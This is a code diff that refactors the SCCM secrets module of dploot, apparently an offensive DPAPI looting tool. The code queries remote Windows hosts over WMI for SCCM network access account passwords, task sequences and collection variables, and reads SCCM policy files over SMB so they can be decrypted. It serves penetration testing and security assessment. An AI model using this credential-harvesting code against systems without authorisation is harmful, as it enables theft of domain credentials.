@@ -4,12 +4,10 @@ import re
 
 from dploot.triage import Triage
 from dploot.lib.dpapi import decrypt_blob, find_masterkey_for_blob
-from dploot.lib.smb import DPLootSMBConnection
+from dploot.lib.network import DPLootConnection
+from dploot.lib.network.wmi import DPLootWMIConnection
 from dploot.lib.target import Target
 from dploot.triage.masterkeys import Masterkey
-from impacket.dcerpc.v5.dcom import wmi
-from impacket.dcerpc.v5.dtypes import NULL
-from impacket.dcerpc.v5.dcomrt import DCOMConnection
 
 
 class SCCM:
@@ -71,7 +69,7 @@ class SCCMTriage(Triage):
     def __init__(
         self,
         target: Target,
-        conn: DPLootSMBConnection,
+        conn: DPLootConnection,
         masterkeys: List[Masterkey],
         per_secret_callback: Callable = None,
     ) -> None:
@@ -225,67 +223,48 @@ class SCCMTriage(Triage):
         sccm_cred = []
         sccm_task = []
         sccm_collection = []
-        namespace = "root\\ccm\\Policy\\Machine\\RequestedConfig"
+    
         query_naa = "SELECT NetworkAccessUsername, NetworkAccessPassword FROM CCM_NetworkAccessAccount"
         query_task = "SELECT TS_Sequence FROM CCM_TaskSequence"
         query_collection = "SELECT Name, Value FROM CCM_CollectionVariable"
-        try:
-            self.dcom_conn = DCOMConnection(
-                self.target.address,
-                self.target.username,
-                self.target.password,
-                self.target.domain,
-                self.target.lmhash,
-                self.target.nthash,
-                self.target.aesKey,
-                oxidResolver=True,
-                doKerberos=self.target.do_kerberos,
-                kdcHost=self.target.dc_ip,
-            )
-            iInterface = self.dcom_conn.CoCreateInstanceEx(
-                wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login
-            )
-            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
-            iWbemServices = iWbemLevel1Login.NTLMLogin(namespace, NULL, NULL)
-            iWbemLevel1Login.RemRelease()
 
-            logging.debug("Query WMI for Network access accounts")
-            iEnumWbemClassObject = iWbemServices.ExecQuery(query_naa)
-            sccm_cred = self.parse_wmi_reply(iEnumWbemClassObject)
+        namespace = self.conn.get_namespace("root\\ccm\\Policy\\Machine\\RequestedConfig")
+        if namespace is not None:
+            try:
+                
+                logging.debug("Query WMI for Network access accounts")
+                class_obj = self.conn.execute_wmi_query(query_naa, namespace)
+                sccm_cred = self.parse_wmi_reply(class_obj)
 
-            logging.debug("Query WMI for Task sequences")
-            iEnumWbemClassObject = iWbemServices.ExecQuery(query_task)
-            sccm_task = self.parse_wmi_reply(iEnumWbemClassObject)
+                logging.debug("Query WMI for Task sequences")
+                class_obj = self.conn.execute_wmi_query(query_task, namespace)
+                sccm_task = self.parse_wmi_reply(class_obj)
 
-            logging.debug("Query WMI for collection variables")
-            iEnumWbemClassObject = iWbemServices.ExecQuery(query_collection)
-            sccm_collection = self.parse_wmi_reply(iEnumWbemClassObject)
+                logging.debug("Query WMI for collection variables")
+                class_obj = self.conn.execute_wmi_query(query_collection, namespace)
+                sccm_collection = self.parse_wmi_reply(class_obj)
 
-            iEnumWbemClassObject.RemRelease()
-        except (Exception, KeyboardInterrupt) as e:
-            if logging.getLogger().level == logging.DEBUG:
-                import traceback
-
-                traceback.print_exc()
-                logging.debug(str(e))
-        finally:
-            if self.dcom_conn is not None:
-                self.dcom_conn.disconnect()
+                class_obj.RemRelease()
+            except (Exception, KeyboardInterrupt) as e:
+                if logging.getLogger().level == logging.DEBUG:
+                    import traceback
+                    traceback.print_exc()
+                    logging.debug(str(e))
         return sccm_cred, sccm_task, sccm_collection
 
     def triage_sccm(
-        self, use_wmi: bool
+        self,
     ) -> Tuple[List[SCCMCred], List[SCCMSecret], List[SCCMCollection]]:
         sccm_cred = []
         sccm_task = []
         sccm_collection = []
         try:
-            if use_wmi:
+            if type(self.conn) == DPLootWMIConnection:
                 sccm_cred, sccm_task, sccm_collection = self.wmi_collect_sccm_secrets()
             else:
-                objectfile = self.conn.readFile(
-                    self.share,
-                    self.sccm_objectdata_filepath,
+                objectfile = self.conn.read_file(
+                    share=self.share,
+                    path=self.sccm_objectdata_filepath,
                     bypass_shared_violation=True,
                     looted_files=self.looted_files
                 )
